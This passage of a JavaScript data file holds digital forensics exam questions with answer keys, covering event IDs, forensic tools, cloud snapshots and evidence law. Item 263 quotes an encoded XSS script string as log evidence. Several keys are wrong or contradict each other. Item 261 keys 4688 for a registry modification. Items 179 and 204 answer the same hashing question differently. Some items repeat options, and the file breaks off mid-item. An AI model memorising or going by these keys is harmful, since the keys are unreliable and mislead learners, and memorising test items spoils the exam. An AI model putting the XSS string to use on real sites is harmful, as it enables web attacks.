      "Identify the SQLite file that contains logged-in users on Alexa devices and gets cleared upon logout.",
    options: [
      "DataStore.db",
      "map_data_storage.db",
      "complications.db",
      "gservices.db",
    ],
    correctAnswer: 1,
  },
  {
    id: 133,
    question:
      "Which Azure CLI command provides time-limited read-only access to a snapshot?",
    options: [
      "az vm show",
      "az snapshot grant-access",
      "az storage blob show",
      "az snapshot delete",
    ],
    correctAnswer: 1,
  },
  {
    id: 134,
    question:
      "Which of the following tools is used for recovering deleted files?",
    options: ["Recuva", "Nessus", "Nmap", "OpenVAS"],
    correctAnswer: 0,
  },
  {
    id: 135,
    question:
      "After snapshotting a malware-infected EC2 instance, what should the forensics team do next?",
    options: [
      "Terminate the instance after taking necessary backup",
      "Pause the running instance",
      "Keep the instance running",
      "Terminate all instances in the VPC",
    ],
    correctAnswer: 0,
  },
  {
    id: 136,
    question:
      "In cases involving APTs, what's the best way to manage complex digital evidence?",
    options: [
      "Invest in powerful automated tools",
      "Bypass legal requirements",
      "Use traditional local device analysis",
      "Collaborate with international law enforcement",
    ],
    correctAnswer: 0,
  },
  {
    id: 137,
    question:
      "Which forensic technique involves hashing and comparing binaries?",
    options: [
      "Malware Disassembly",
      "Identifying file dependencies",
      "File fingerprinting",
      "String search",
    ],
    correctAnswer: 2,
  },
  {
    id: 138,
    question: "Which attack exploits a buffer overflow?",
    options: ["Ransomware", "DoS", "Code injection", "SQL Injection"],
    correctAnswer: 2,
  },
  {
    id: 139,
    question: "What does TSK stand for in digital forensics?",
    options: [
      "Traceroute System Key",
      "The Sleuth Kit",
      "Temporal Storage Keeper",
      "Timely Security Key",
    ],
    correctAnswer: 1,
  },
  {
    id: 140,
    question: "Which command converts E01 image files to dd format on Linux?",
    options: ["wevtutil", "losetup -f", "xmount", "lsblk"],
    correctAnswer: 2,
  },
  {
    id: 141,
    question: "Which is NOT a characteristic of volatile memory?",
    options: [
      "Retains data after power loss",
      "Found in RAM",
      "Data must be collected immediately",
      "Used for running processes",
    ],
    correctAnswer: 0,
  },
  {
    id: 142,
    question:
      "Which tool allows forensic investigators to perform Apache log analysis?",
    options: ["FaceNiff", "Halberd", "iStumbler", "GoAccess"],
    correctAnswer: 3,
  },
  {
    id: 143,
    question: "What is a common tool used for network traffic analysis?",
    options: ["FTK Imager", "EnCase", "Autopsy", "Wireshark"],
    correctAnswer: 3,
  },
  {
    id: 144,
    question:
      "What data acquisition method is used when collecting evidence from a powered-off system?",
    options: [
      "Data backup",
      "Dead acquisition",
      "Volatile data acquisition",
      "Live acquisition",
    ],
    correctAnswer: 1,
  },
  {
    id: 145,
    question: "Which is NOT a common type of digital evidence?",
    options: [
      "Physical fingerprints",
      "Email messages",
      "Social media posts",
      "Hard drive data",
    ],
    correctAnswer: 0,
  },
  {
    id: 146,
    question: "Which of the following is a common cyberattack?",
    options: ["DDoS", "SQL injection", "Phishing", "All of the above"],
    correctAnswer: 3,
  },
  {
    id: 147,
    question:
      "What do security cameras, badges, and fire extinguishers represent in a forensics lab?",
    options: [
      "Planning and budgeting",
      "Physical/structural design",
      "Work area considerations",
      "Physical security considerations",
    ],
    correctAnswer: 3,
  },
  {
    id: 148,
    question: "The offset in a hexadecimal code is:",
    options: [
      "First byte after the colon",
      "0x at end of code",
      "0x at the beginning of the code",
      "Last byte after the colon",
    ],
    correctAnswer: 2,
  },
  {
    id: 149,
    question:
      "Which tool shows related modules in an executable and builds a tree of functions?",
    options: ["ResourcesExtract", "Dependency Walker", "VirusTotal", "OllyDbg"],
    correctAnswer: 1,
  },
  {
    id: 150,
    question:
      "Which incident response phase includes eliminating the root cause and closing attack vectors?",
    options: [
      "Incident triage",
      "Preparation",
      "Eradication",
      "Post-incident activities",
    ],
    correctAnswer: 2,
  },
  {
    id: 151,
    question:
      "What is the right combo of Event IDs for account creation, privilege escalation, and service install?",
    options: [
      "624, 4670, 6011",
      "4720, 500, 6011",
      "4720, 4672, 7045",
      "624, 500, 7045",
    ],
    correctAnswer: 2,
  },
  {
    id: 152,
    question:
      "Which tool identifies file extension mismatches to assist forensic investigations?",
    options: ["Autopsy", "Stream Detector", "zteg", "StegoHunt"],
    correctAnswer: 0,
  },
  {
    id: 153,
    question:
      "Which `nbtstat` command gets the count of NetBIOS names resolved by broadcast?",
    options: ["nbtstat -n", "nbtstat -n", "nbtstat -S", "nbtstat -r"],
    correctAnswer: 3,
  },
  {
    id: 154,
    question: "What does 'anti-forensics' refer to?",
    options: [
      "Methods used to obstruct forensic investigations",
      "Automated forensic tools",
      "Recovering deleted files",
      "Bypassing encryption",
    ],
    correctAnswer: 0,
  },
  {
    id: 155,
    question: "Which registry keys track a user's folder viewing preferences?",
    options: ["Superblocks", "Slack space", "ShellBags", "Spotlight"],
    correctAnswer: 2,
  },
  {
    id: 156,
    question:
      "Which Event ID shows allowed connection via UDP/TCP by Windows Filtering Platform?",
    options: ["Event ID 5156", "4660 and 4663", "7045 and 4657", "4688"],
    correctAnswer: 0,
  },
  {
    id: 157,
    question: "Which is a volatile storage medium?",
    options: ["SSD", "USB drive", "RAM", "HDD"],
    correctAnswer: 2,
  },
  {
    id: 158,
    question: "What is the process of recovering deleted files from storage?",
    options: [
      "Data recovery",
      "Data wiping",
      "Data encryption",
      "Data compression",
    ],
    correctAnswer: 0,
  },
  {
    id: 159,
    question:
      "What is the smallest allocation unit on a hard disk made up of multiple sectors?",
    options: ["Track", "Sector", "4Platter", "Cluster"],
    correctAnswer: 3,
  },
  {
    id: 160,
    question: "A lay witness is considered an expert in what field?",
    options: [
      "Forensics",
      "Legal issues",
      "No particular field",
      "Judging character",
    ],
    correctAnswer: 2,
  },
  {
    id: 161,
    question:
      "Which correlation approach compares all fields systematically for both positive and negative matches?",
    options: [
      "Automated field correlation",
      "Codebook-based",
      "Field-based",
      "Rule-based",
    ],
    correctAnswer: 0,
  },
  {
    id: 162,
    question:
      "Which event log type is used by batch servers executing processes without user interaction?",
    options: ["10", "4", "11", "3"],
    correctAnswer: 1,
  },
  {
    id: 163,
    question: "Where in the registry are Tor browser artifacts stored?",
    options: [
      "Shell\\BagMRU",
      "HKEY_USERS<SID>\\SOFTWARE\\Mozilla\\Firefox\\Launcher",
      "NetworkList\\Profiles",
      "Classes\\exefile",
    ],
    correctAnswer: 1,
  },
  {
    id: 164,
    question: "Which tool helps reverse machine code to assembly?",
    options: ["HashCalc", "BinText", "Ollydbg", "oledump"],
    correctAnswer: 2,
  },
  {
    id: 165,
    question: "Which ISO standard covers electronic discovery processes?",
    options: [
      "ISO/IEC 27041",
      "ISO/IEC 27042",
      "ISO/IEC 27043",
      "ISO/IEC 27050",
    ],
    correctAnswer: 3,
  },
  {
    id: 166,
    question:
      "What should a forensics team do after taking an EBS snapshot of a compromised EC2 instance?",
    options: [
      "Pause the instance",
      "Terminate all in VPC",
      "Terminate after backup",
      "Keep it running",
    ],
    correctAnswer: 2,
  },
  {
    id: 167,
    question:
      "Which Federal Rule promotes fair trials and efficiency in evidence law?",
    options: ["Rule 801", "Rule 102", "Rule 105", "Rule 1003"],
    correctAnswer: 1,
  },
  {
    id: 168,
    question: "What's a common method to detect rootkits?",
    options: [
      "File integrity monitoring",
      "Browser history analysis",
      "Packet capture",
      "Disk imaging",
    ],
    correctAnswer: 0,
  },
  {
    id: 169,
    question:
      "What defines how investigators are expected to act during cases?",
    options: [
      "Lawful interception",
      "TTPs",
      "Code of ethics",
      "System baselining",
    ],
    correctAnswer: 2,
  },
  {
    id: 170,
    question:
      "What describes an organization’s ability to efficiently handle digital evidence?",
    options: [
      "Forensic readiness",
      "Trial obfuscation",
      "Chain of custody",
      "Vulnerability assessment",
    ],
    correctAnswer: 0,
  },
  {
    id: 171,
    question: "What is a common Linux file system?",
    options: ["HFS+", "NTFS", "ext4", "FAT32"],
    correctAnswer: 2,
  },
  {
    id: 172,
    question:
      "Which layer in the IoT architecture consists of hardware components, including sensors, RFID tags, and readers?",
    options: [
      "Middleware layer",
      "Edge technology layer",
      "Internet layer",
      "Access gateway layer",
    ],
    correctAnswer: 1,
  },
  {
    id: 173,
    question:
      "Which tool allows forensic investigators to extract web activity information such as event timestamp, port, server status code, etc.?",
    options: ["Suphacap", "HttpLogBrowser", "CRITIFENCE", "Postman"],
    correctAnswer: 1,
  },
  {
    id: 174,
    question:
      "Which component in the Microsoft Excel file structure holds information about each workbook’s features?",
    options: ["Records", "Streams", "Global substream", "Worksheet substream"],
    correctAnswer: 1,
  },
  {
    id: 175,
    question:
      "Which Apache core element manages routines, interacts with clients, and handles data exchange and socket connections?",
    options: ["http_main", "http_protocol", "http_request", "http_core"],
    correctAnswer: 2,
  },
  {
    id: 176,
    question:
      "Which program allows bundling all files together into a single executable file via compression to bypass security software?",
    options: ["Dropper", "Packer", "Obfuscator", "Payload"],
    correctAnswer: 1,
  },
  {
    id: 177,
    question:
      "Which approach helps investigators identify if a system serves as a relay for a hacker and gather event data?",
    options: [
      "Event de-duplication",
      "Fingerprint-based approach",
      "Event aggregation",
      "Vulnerability-based approach",
    ],
    correctAnswer: 2,
  },
  {
    id: 178,
    question:
      "Which command allows investigators to mount an image in the APFS format and view its contents on a Linux system?",
    options: ["wevtutil", "fsutil", "losetup", "strings"],
    correctAnswer: 2,
  },
  {
    id: 179,
    question: "Which hashing algorithm is commonly used in digital forensics?",
    options: ["MD5", "SHA-1", "SHA-256", "All of the above"],
    correctAnswer: 0,
  },
  {
    id: 180,
    question:
      "Which of the following is a common tool used for network traffic analysis?",
    options: ["Wireshark", "Autopsy", "EnCase", "FTK Imager"],
    correctAnswer: 0,
  },
  {
    id: 181,
    question: "What is the purpose of chain of custody documentation?",
    options: [
      "To analyze the evidence for digital artifacts",
      "To identify potential suspects in a cybercrime",
      "To recover deleted files from a storage device",
      "To track the evidence from collection to court",
    ],
    correctAnswer: 3,
  },
  {
    id: 182,
    question: "What is the purpose of the MAC address in a network?",
    options: [
      "Resolving domain names to IP addresses",
      "Providing a virtual IP address",
      "Identifying devices at the physical layer",
      "Encrypting network traffic",
    ],
    correctAnswer: 2,
  },
  {
    id: 183,
    question:
      "Which layer of the OSI model is responsible for data encryption?",
    options: ["Physical", "Presentation", "Transport", "Application"],
    correctAnswer: 1,
  },
  {
    id: 184,
    question:
      "Which of the following is a legal document that demonstrates the progression of evidence from its original location to the forensic laboratory?",
    options: [
      "Origin of Custody",
      "Evidence Examine",
      "Chain of Custody",
      "Evidence Document",
    ],
    correctAnswer: 2,
  },
  {
    id: 185,
    question:
      "Which type of digital data stores a document file on a computer when it is deleted and helps in the process of retrieving the file until that file space is reused?",
    options: ["Metadata", "Residual Data", "Archival Data", "Transient Data"],
    correctAnswer: 1,
  },
  {
    id: 186,
    question: "What is the purpose of hashing in digital forensics?",
    options: [
      "To hide data",
      "To verify data integrity",
      "To compress data",
      "To encrypt data",
    ],
    correctAnswer: 1,
  },
  {
    id: 187,
    question:
      "Which role is played by international agencies when cybercrime crosses state or international borders and requires sharing information and resources with other state agencies?",
    options: [
      "Investigation",
      "Collaboration",
      "Policy and regulation",
      "Victim assistance",
    ],
    correctAnswer: 1,
  },
  {
    id: 188,
    question:
      "Which of the following challenges of cybercrime is demonstrated when the attacker hides their IP address using proxies and uses a fake identity for communication?",
    options: [
      "Evidence size and complexity",
      "Anonymity",
      "Limited legal understanding",
      "Speed",
    ],
    correctAnswer: 1,
  },
  {
    id: 189,
    question:
      "Which device is responsible for translating internal private IP addresses to a public IP address?",
    options: ["Firewall", "Switch", "Router", "NAT device"],
    correctAnswer: 3,
  },
  {
    id: 190,
    question:
      "Which of the following practices indicates that an organization is not forensically prepared to maintain business continuity?",
    options: [
      "Legally persecute the perpetrators and claim damages",
      "Quickly determine the incidents",
      "Minimize the required resources",
      "Inability to collect legally sound evidence",
    ],
    correctAnswer: 3,
  },
  {
    id: 191,
    question:
      "Which of the following factors of cloud forensics involves assisting organizations in following appropriate rules and adhering to requirements such as securing critical data, maintaining records for audit, and notifying the parties affected by sensitive data exposure?",
    options: [
      "Regulatory compliance",
      "System recovery",
      "Log monitoring",
      "Data recovery",
    ],
    correctAnswer: 0,
  },
  {
    id: 192,
    question:
      "Which of the following tools helps Rowen to acquire data remotely?",
    options: ["BitLocker", "L0phtCrack", "rtgen", "netcat"],
    correctAnswer: 3,
  },
  {
    id: 193,
    question:
      "Identify the process that involves discovering, protecting, collecting, reviewing, and presenting electronically stored information (ESI) during an investigation.",
    options: ["Jailbreaking", "eDiscovery", "Rooting", "Chain of Custody"],
    correctAnswer: 1,
  },
  {
    id: 194,
    question:
      "Which stage in the booting process of a Linux system establishes a temporary root file system using the initial RAM disk (initrd) until the real file system is mounted?",
    options: [
      "BIOS stage",
      "Bootloader stage",
      "Grand unified bootloader (GRUB) stage",
      "Kernel stage",
    ],
    correctAnswer: 3,
  },
  {
    id: 195,
    question:
      "Mike, a forensic investigator, finds a computer at the crime scene that is switched off. What should he do?",
    options: [
      "He should leave the computer off",
      "He should turn on the computer",
      "He should turn on the computer and start analyzing it",
      "He should leave the computer off",
    ],
    correctAnswer: 0,
  },
  {
    id: 196,
    question:
      "Which forensic artifact would indicate the last time a user logged in to a system?",
    options: [
      "Browser history",
      "Registry entries",
      "Security event logs",
      "File timestamps",
    ],
    correctAnswer: 2,
  },
  {
    id: 197,
    question: "What is the primary role of EnCase in digital forensics?",
    options: [
      "Disk imaging",
      "Log analysis",
      "Email investigation",
      "Network scanning",
    ],
    correctAnswer: 0,
  },
  {
    id: 198,
    question: "What does ARP stand for in networking?",
    options: [
      "Address Reallocation Process",
      "Application Routing Path",
      "Automated Routing Protocol",
      "Address Resolution Protocol",
    ],
    correctAnswer: 3,
  },
  {
    id: 199,
    question:
      "Thomas, a forensics specialist, was resolving a case related to fake email broadcasting. He retrieved data from the victim system for analysis to find the source of the email server. He extracted only “.ost” files for this purpose. What type of data acquisition did Thomas perform?",
    options: [
      "Bit-stream disk-to-disk",
      "Bit-stream disk-to-image-file",
      "Sparse acquisition",
      "Logical acquisition",
    ],
    correctAnswer: 3,
  },
  {
    id: 200,
    question: "What is the purpose of hash functions in digital forensics?",
    options: [
      "Compressing forensic images",
      "Ensuring file integrity",
      "Encrypting data for secure storage",
      "Detecting malware",
    ],
    correctAnswer: 1,
  },
  {
    id: 201,
    question:
      "In what scenario would a forensic investigator use the tool Wireshark?",
    options: [
      "To create disk images",
      "To analyze email headers",
      "To recover deleted files",
      "To analyze network traffic",
    ],
    correctAnswer: 3,
  },
  {
    id: 202,
    question:
      "Which of the following registry datatypes in a Windows system is used for storing encoded information?",
    options: [
      "REG_NONE",
      "REG_SZ",
      "REG_DWORD",
      "REG_FULL_RESOURCE_DESCRIPTOR",
    ],
    correctAnswer: 3,
  },
  {
    id: 203,
    question:
      "Which of the following techniques refers to the process of discovering the existence of hidden information within a cover medium?",
    options: ["Steganalysis", "Steganography", "Encryption", "Cryptography"],
    correctAnswer: 0,
  },
  {
    id: 204,
    question: "Which hashing algorithm is widely used in digital forensics?",
    options: ["SHA-256", "MD5", "All of the above", "SHA-1"],
    correctAnswer: 2,
  },
  {
    id: 205,
    question:
      "Which attack technique is the combination of both a brute-force attack and a dictionary attack to crack a password?",
    options: [
      "Hybrid Attack",
      "Rule-based Attack",
      "Fusion Attack",
      "Syllable Attack",
    ],
    correctAnswer: 0,
  },
  {
    id: 206,
    question: "Which file system is case-sensitive by default?",
    options: ["exFAT", "FAT32", "NTFS", "ext4"],
    correctAnswer: 3,
  },
  {
    id: 207,
    question:
      "Williams, a forensics specialist, analyzed a malware sample in binary format using OllyDbg to identify the language and functions. What malware analysis technique did Williams use?",
    options: [
      "File fingerprinting",
      "Malware disassembly",
      "Performing string searches",
      "Identifying packing or obfuscation methods",
    ],
    correctAnswer: 1,
  },
  {
    id: 208,
    question:
      "What is the primary function of the tool Autopsy in digital forensics?",
    options: [
      "Data carving",
      "Malware detection",
      "Disk imaging",
      "Network scanning",
    ],
    correctAnswer: 0,
  },
  {
    id: 209,
    question:
      "A forensic investigator is analyzing a Windows 10 machine that has crashed several times in the past week. What should be the investigator's most immediate action?",
    options: [
      "Apply Handle.exe to see the object types and names of all the handles of the crashed programs",
      "Use the Process Dumper tool to dump the entire process space and analyze the contents in the RAM dump file",
      "Analyze the crash dump files using DumpChk to examine the system crash's cause and identify any errors in the applications or the operating system",
      "Utilize Redline to perform Indicators of Compromise (IOC) analysis and construct a timeline of potential cyber incidents",
    ],
    correctAnswer: 2,
  },
  {
    id: 210,
    question:
      "Bob, a forensic expert, wants to examine image files in the E01 format on his Linux machine. Which command can he use to convert the E01-format files into the dd format?",
    options: ["xmount", "lsblk", "wevtutil", "losetup -f"],
    correctAnswer: 0,
  },
  {
    id: 211,
    question: 'What does a "boot sector" virus target?',
    options: [
      "User data files",
      "Network configurations",
      "Operating system files",
      "MBR (Master Boot Record)",
    ],
    correctAnswer: 3,
  },
  {
    id: 212,
    question:
      "What is the name of the process of making a bit-by-bit copy of a digital device?",
    options: ["Cloning", "Formatting", "Hashing", "Imaging"],
    correctAnswer: 3,
  },
  {
    id: 213,
    question:
      "Bob discovered password-protected files during a forensic investigation and initiated a password-cracking technique that tries every possible combination of characters until the password is cracked. Which technique did Bob use?",
    options: [
      "Pass-the-ticket attack",
      "Brute-force attack",
      "Dictionary Attack",
      "Wire sniffing",
    ],
    correctAnswer: 1,
  },
  {
    id: 214,
    question:
      "Which of the following is a common type of malware that replicates itself?",
    options: ["Virus", "Trojan horse", "Worm", "Spyware"],
    correctAnswer: 2,
  },
  {
    id: 215,
    question:
      "Which of the following is an 802.11 network discovery tool that gathers information about nearby wireless APs in real-time and displays it in different diagnostic views and charts?",
    options: [
      "ESEDatabaseView",
      "Free Hex Editor Neo",
      "NetSurveyor",
      "Hex Workshop",
    ],
    correctAnswer: 2,
  },
  {
    id: 216,
    question:
      "Which of the following is an open-source forensic tool that enables the reliable extraction of the entire contents of a computer’s volatile memory, even if protected by an active anti-debugging or anti-dumping system?",
    options: [
      "Nessus",
      "THC Hydra",
      "Belkasoft RAM Capturer",
      "Dependency Walker",
    ],
    correctAnswer: 2,
  },
  {
    id: 217,
    question:
      "Identify the malware distribution technique using which attackers use tactics such as keyword stuffing, doorway pages, page swapping, and the addition of unrelated keywords to get a higher ranking on the web for their malware pages.",
    options: [
      "Social engineered clickjacking",
      "Blackhat search engine optimization",
      "Drive-by downloads",
      "Spear phishing sites",
    ],
    correctAnswer: 1,
  },
  {
    id: 218,
    question:
      "Which of the following is a dedicated high-speed network that provides access to consolidated block-level storage, independent of network traffic?",
    options: ["SSD", "NAS", "SAN", "HDD"],
    correctAnswer: 2,
  },
  {
    id: 219,
    question: "In the OSI model, at which layer does packet filtering occur?",
    options: ["Physical", "Network", "Transport", "Data Link"],
    correctAnswer: 1,
  },
  {
    id: 220,
    question:
      "Which of the following refers to the process of the witness being questioned by the attorney who called the latter to the stand?",
    options: [
      "Witness Authentication",
      "Direct Examination",
      "Expert Witness",
      "Cross Questioning",
    ],
    correctAnswer: 1,
  },
  {
    id: 221,
    question: "What is the main difference between TCP and UDP?",
    options: [
      "UDP uses encryption by default",
      "TCP is used for video streaming",
      "TCP is connection-oriented, while UDP is connectionless",
      "TCP is faster than UDP",
    ],
    correctAnswer: 2,
  },
  {
    id: 222,
    question:
      "Which of the following is a common tool for analyzing network traffic?",
    options: ["Wireshark", "FTK Imager", "EnCase", "Autopsy"],
    correctAnswer: 0,
  },
  {
    id: 223,
    question:
      "Which of the following issues in computer forensics might arise because of improper handling of evidence during an investigation, making the evidence inadmissible in a court of law?",
    options: [
      "Privacy issues",
      "Infrastructure issues",
      "Legal jurisdiction issues",
      "Legal issues",
    ],
    correctAnswer: 3,
  },
  {
    id: 225,
    question:
      "Which of the following files has 25 50 44 46 as the first characters in hexadecimal representation?",
    options: ["PDF", "BMP", "GIF", "JPEG"],
    correctAnswer: 0,
  },
  {
    id: 226,
    question: "In which RAID level disk mirroring is done?",
    options: ["RAID Level 1", "RAID Level 5", "RAID Level 0", "RAID Level 3"],
    correctAnswer: 0,
  },
  {
    id: 228,
    question:
      "As a Computer Hacking Forensic Investigator, you are analyzing an intrusion incident involving fileless malware delivered via a malicious Word document. Which step would be most effective to disrupt the infection chain?",
    options: [
      "Replacing the antivirus solution with a signature-based IDS",
      "Patching Flash and Java vulnerabilities in browsers",
      "Disabling scripting languages like JavaScript",
      "Implementing a strict policy on macros embedded in Office documents",
    ],
    correctAnswer: 3,
  },
  {
    id: 229,
    question: "What is the role of a swap file in a computer system?",
    options: [
      "Stores system logs",
      "Encrypts system files",
      "Stores BIOS settings",
      "Acts as virtual memory",
    ],
    correctAnswer: 3,
  },
  {
    id: 230,
    question:
      "Andrew is performing a UEFI boot process. The current phase consists of initialization code that executes after powering on the system. Which UEFI boot phase is this?",
    options: [
      "Boot device selection (BDS) phase",
      "Security (SEC) phase",
      "Pre-EFI initialization (PEI) phase",
      "Driver execution environment (DXE) phase",
    ],
    correctAnswer: 1,
  },
  {
    id: 231,
    question:
      "Which process involves the technical methods and organizational measures for discovering, tracing, and inculpating individuals or groups responsible for cyberattacks?",
    options: [
      "eDiscovery",
      "Data recovery",
      "Cyber Attribution",
      "Physical acquisition",
    ],
    correctAnswer: 2,
  },
  {
    id: 232,
    question:
      "John, a forensic investigator, needs to get the count of all NetBIOS names resolved by broadcast by querying a WINS server. Which command should he use?",
    options: ["nbtstat -n", "nbtstat -r", "nbtstat -n", "nbtstat -S"],
    correctAnswer: 1,
  },
  {
    id: 233,
    question:
      "Which of the following layers in the IoT architecture consists of all the hardware components, including sensors, RFID tags, and readers, and plays an important part in data collection and connecting devices within the network?",
    options: [
      "Edge technology layer",
      "Access gateway layer",
      "Internet layer",
      "Middleware layer",
    ],
    correctAnswer: 0,
  },
  {
    id: 234,
    question:
      "Which hashing algorithm is considered the most secure among the options below?",
    options: ["SHA-1", "RC4", "MD5", "SHA-256"],
    correctAnswer: 3,
  },
  {
    id: 235,
    question:
      "Since Hillary is a lay witness, what field would she be considered an expert in?",
    options: [
      "No particular field",
      "Technical material related to forensics",
      "Legal issues",
      "Judging the character of defendants/victims",
    ],
    correctAnswer: 0,
  },
  {
    id: 236,
    question:
      "What is a key advantage of forensic imaging over direct analysis?",
    options: [
      "Ensures original data integrity",
      "More detailed reports",
      "Compatibility with all tools",
      "Faster data access",
    ],
    correctAnswer: 0,
  },
  {
    id: 237,
    question: "Which tool is commonly used for sniffing network packets?",
    options: ["Netcat", "Wireshark", "Nessus", "EnCase"],
    correctAnswer: 1,
  },
  {
    id: 238,
    question:
      "Which of the following sections of the (ACPO) Principles of Digital Evidence states that no action taken by law enforcement agencies should change data that may subsequently be relied upon in court?",
    options: ["Principle 1", "Principle 3", "Principle 2", "Principle 4"],
    correctAnswer: 0,
  },
  {
    id: 239,
    question: "Which port is used for HTTPS traffic?",
    options: ["443", "21", "80", "22"],
    correctAnswer: 0,
  },
  {
    id: 240,
    question:
      "Identify the default location in Fedora Linux from which Clark obtained system access logs.",
    options: [
      "/var/log/httpd/access_log",
      "/var/log/apache2/access.log",
      "/var/log/httpd-access.log",
      "/etc/httpd/conf/httpd.conf",
    ],
    correctAnswer: 0,
  },
  {
    id: 241,
    question:
      "Which of the following U.S. laws requires financial institutions to protect their customers' information against security threats?",
    options: ["GLBA", "HIPAA", "SOX", "FISMA"],
    correctAnswer: 0,
  },
  {
    id: 242,
    question:
      "Kannon, a forensics specialist, secured affected devices for further investigation. Which investigation step did Kannon perform?",
    options: [
      "Data analysis",
      "Data acquisition",
      "Search and seizure",
      "Case analysis",
    ],
    correctAnswer: 2,
  },
  {
    id: 243,
    question:
      "During an investigation, you locate evidence that may prove the innocence of the suspect. What type of evidence is this?",
    options: [
      "Terrible evidence",
      "Inculpatory evidence",
      "Exculpatory evidence",
      "Mandatory evidence",
    ],
    correctAnswer: 2,
  },
  {
    id: 244,
    question:
      "Which of the following tools assists investigators in retrieving deleted email messages from Outlook and Thunderbird email clients?",
    options: ["Paraben's E3", "LiME", "Encase", "THC-Hydra"],
    correctAnswer: 0,
  },
  {
    id: 245,
    question: "Which port does FTP use for active data transfer?",
    options: ["21", "80", "20", "22"],
    correctAnswer: 2,
  },
  {
    id: 246,
    question:
      "Which of the following is a proprietary information security standard for organizations that handle cardholder information for major debit, credit, prepaid, e-purse, ATM, and POS cards?",
    options: ["GLBA", "PCI DSS", "FISMA", "SOX"],
    correctAnswer: 1,
  },
  {
    id: 247,
    question:
      "Which of the following tools can be used to analyze network traffic?",
    options: ["EnCase", "Autopsy", "Wireshark", "FTK Imager"],
    correctAnswer: 2,
  },
  {
    id: 248,
    question: "What countermeasures could George take to prevent DDoS attacks?",
    options: [
      "Enable direct broadcasts",
      "Enable BGP",
      "Disable direct broadcasts",
      "Disable BGP",
    ],
    correctAnswer: 2,
  },
  {
    id: 249,
    question:
      "Which feature will you disable to eliminate the ability to enumerate model, OS version, and capabilities on Cisco routers?",
    options: [
      "Simple Network Management Protocol",
      "Broadcast System Protocol",
      "Cisco Discovery Protocol",
      "Border Gateway Protocol",
    ],
    correctAnswer: 2,
  },
  {
    id: 250,
    question:
      "Which of the following is an open-source forensics tool that allows investigators to extract and analyze artifacts from PCAP, PcapNG, and ETL packet captures?",
    options: ["LogonSessions", "tasklist", "NetworkMiner", "pwdump7"],
    correctAnswer: 2,
  },
  {
    id: 251,
    question:
      "What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceedings?",
    options: [
      "Robust copy",
      "Bit-stream copy",
      "Full backup copy",
      "Incremental backup copy",
    ],
    correctAnswer: 1,
  },
  {
    id: 252,
    question:
      "In which of the following attacks does an attacker exploit “http” to gain access to unauthorized directories and execute commands outside the web server’s root directory?",
    options: [
      "Denial of service (DoS)",
      "Buffer overflow",
      "Unvalidated input",
      "Path traversal",
    ],
    correctAnswer: 3,
  },
  {
    id: 253,
    question:
      "Which type of cyberattack exploits a buffer overflow vulnerability?",
    options: ["Ransomware", "Code injection", "DoS", "SQL Injection"],
    correctAnswer: 1,
  },
  {
    id: 254,
    question:
      "Which of the following roles is played by international agencies when cybercrime crosses state or international borders and requires them to share information and resources with other state agencies?",
    options: [
      "Investigation",
      "Collaboration",
      "Policy and regulation",
      "Victim assistance",
    ],
    correctAnswer: 1,
  },
  {
    id: 255,
    question: "What is the primary purpose of digital evidence preservation?",
    options: [
      "Speed up the analysis process",
      "Ensure data confidentiality",
      "Maintain integrity for legal proceedings",
      "Encrypt all collected data",
    ],
    correctAnswer: 2,
  },
  {
    id: 256,
    question:
      "Which of the following parameters in the Apache common log format represents the client’s IP address?",
    options: ["%I", "%u", "%h", "%t"],
    correctAnswer: 2,
  },
  {
    id: 257,
    question:
      "Which of the following components of EFS is a part of the security subsystem and acts as an interface with the EFS driver by using a local procedure call (LPC) communication port between the local security authority (LSA) and the kernel-mode security reference monitor?",
    options: ["EFS FSRTL", "CryptoAPI", "EFS service", "EFS driver"],
    correctAnswer: 2,
  },
  {
    id: 258,
    question:
      "Which of the following is NOT a characteristic of volatile memory?",
    options: [
      "Found in RAM",
      "Used for running processes",
      "Data must be collected immediately",
      "Retains data after power loss",
    ],
    correctAnswer: 3,
  },
  {
    id: 259,
    question:
      "In digital forensics, which file format is commonly used for creating forensic images of a drive?",
    options: [".log", ".ios", ".dd", ".exe"],
    correctAnswer: 2,
  },
  {
    id: 260,
    question:
      "Which of the following files in a Windows system helps forensic investigators analyze and identify the historical data for executables run in the system?",
    options: ["Shimcache", "Rp.log File", "Change.log.x File", "Amcache"],
    correctAnswer: 3,
  },
  {
    id: 261,
    question:
      "Maria has executed a suspicious executable file in a controlled environment and wants to see if the file adds/modifies any registry value after execution via Windows Event Viewer. Which of the following event ID should she look for in this scenario?",
    options: [
      "Event ID 4624",
      "Event ID 7040",
      "Event ID 4688",
      "Event ID 4657",
    ],
    correctAnswer: 2,
  },
  {
    id: 262,
    question:
      "Which of the following tools helps investigators expand investigations by allowing the capture of an entire social media account or timeline from which they can search the captured OCR PDF or MHTML file for related content?",
    options: ["HttpLogBrowser", "ThreatStream", "KFSensor", "WebPreserver"],
    correctAnswer: 3,
  },
  {
    id: 263,
    question:
      "Carlos, a forensic analyst, was investigating a system that was compromised earlier. He started the investigation process by extracting the Apache access log entries and searching for malicious HTML tags or their hex equivalents in HTTP requests. Carlos identified some encoded values, such as %3Cscript%3Ealert%28XSS%29%3C%2Fscript%3E in the query string. He assumed it was an XSS attack and decoded them. Which of the following characters represents the hex equivalent %29 in the above scenario?",
    options: [">", ")", "(", "<"],
    correctAnswer: 1,
  },
  {
    id: 264,
    question:
      "Select the tool appropriate for finding the dynamically linked lists of an application or malware.",
    options: ["Dependency Walker", "SysAnalyzer", "ResourcesExtract", "PEiD"],
    correctAnswer: 0,
  },
  {
    id: 265,
    question:
      "When an investigator contacts by telephone the domain administrator or controller listed by a Who is lookup to request all e-mails sent and received for a user account be preserved, what U.S.C. statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
    options: [
      "Title 18, Section 1030",
      "Title 18, Section 2703(d)",
      "Title 18, Section Chapter 90",
      "Title 18, Section 2703(f)",
    ],
    correctAnswer: 3,
  },
  {
    id: 266,
    question:
      "If you come across a sheepdip machine at your client site, what would you infer?",
    options: [
      "A sheepdip coordinates several honeypots",
      "A sheepdip computer is another name for a honeypot",
      "A sheepdip computer is used only for virus-checking.",
      "A sheepdip computer defers a denial of service attack",
    ],
    correctAnswer: 2,
  },
  {
    id: 267,
    question:
      "In a computer forensics investigation, what describes the route that evidence takes from the time you find it until the case is closed or goes to court?",
    options: [
      "rules of evidence",
      "law of probability",
      "chain of custody",
      "policy of separation",
    ],
    correctAnswer: 2,
  },
  {
    id: 268,
    question:
      "How many characters long is the fixed-length MD5 algorithm checksum of a critical system file?",
    options: ["128", "64", "32", "16"],
